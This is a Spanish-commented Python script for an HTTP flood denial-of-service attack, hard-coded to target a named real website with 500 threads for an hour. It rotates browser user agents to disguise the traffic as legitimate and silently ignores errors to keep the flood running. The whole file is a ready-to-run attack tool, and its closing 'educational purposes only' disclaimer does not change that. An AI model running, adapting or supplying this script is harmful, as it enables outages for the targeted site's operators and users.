#!/usr/bin/env python3
import requests
import threading
import time
import argparse
from urllib.parse import urlparse

# --- Configuración ---
TARGET_URL = "https://es.alg.academy/" # URL objetiva
DURATION_SECONDS = 3600  # 1 hora
DEFAULT_THREADS = 500
REQUEST_TIMEOUT = 10  # segundos

# --- User-Agent aleatorios para parecer tráfico legítimo ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
]

# --- Función de ataque de un solo hilo ---
def flood_thread(url, thread_id, stop_event):
    """Envía solicitudes HTTP GET en un bucle hasta que se detenga."""
    parsed_url = urlparse(url)
    host = parsed_url.netloc
    path = parsed_url.path or "/"
    
    headers = {
        "User-Agent": USER_AGENTS[thread_id % len(USER_AGENTS)],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    session = requests.Session()
    session.headers.update(headers)

    request_count = 0
    start_time = time.time()
    while not stop_event.is_set():
        try:
            # Variar ligeramente la petición para evitar cache simple
            current_path = f"{path}?{int(time.time() * 1000)}"
            response = session.get(url, timeout=REQUEST_TIMEOUT, stream=False)
            request_count += 1
            # Opcional: imprimir estado cada ciertas peticiones para depurar
            if request_count % 50 == 0:
                print(f"[Hilo {thread_id}] Peticiones: {request_count} | Estado: {response.status_code} | Tiempo: {time.time() - start_time:.2f}s")
        except requests.exceptions.RequestException as e:
            # Ignorar errores de conexión y continuar
            pass
        except Exception as e:
            # Capturar cualquier otro error inesperado
            pass

    print(f"[Hilo {thread_id}] Detenido. Total peticiones: {request_count}")

# --- Función principal ---
def main():
    parser = argparse.ArgumentParser(description="Script de flood HTTP simple.")
    parser.add_argument("--url", default=TARGET_URL, help="URL objetivo (default: https://es.alg.academy/")
    parser.add_argument("--time", type=int, default=DURATION_SECONDS, help="Duración en segundos (default: 3600)")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Número de hilos (default: 500)")
    args = parser.parse_args()

    print(f"--- Iniciando ataque HTTP Flood ---")
    print(f"Objetivo: {args.url}")
    print(f"Duración: {args.time} segundos")
    print(f"Hilos: {args.threads}")
    print("------------------------------------")

    threads = []
    stop_event = threading.Event()

    # Lanzar hilos de ataque
    for i in range(args.threads):
        t = threading.Thread(target=flood_thread, args=(args.url, i, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    # Esperar el tiempo especificado
    try:
        time.sleep(args.time)
    except KeyboardInterrupt:
        print("\nInterrumpido por el usuario.")

    # Señalizar a todos los hilos que se detengan
    stop_event.set()

    # Esperar a que todos los hilos terminen (con un timeout)
    for t in threads:
        t.join(timeout=2)

    print("--- Ataque finalizado ---")

if __name__ == "__main__":
    main()

# Recuerda que esto es solo para fines educativos y no deve ser utilizado para actividades ilegales. 
# No me ago cargo de cualquier uso indebido de este script ya que no soy responsable de su uso incorrecto.  
# Si decides usarlo, hazlo con responsabilidad y solo en entornos seguros y autorizados. ¡GRACIAS POR USAR ESTE SCRIPT!
print("¡GRACIAS POR USAR ESTE SCRIPT!")
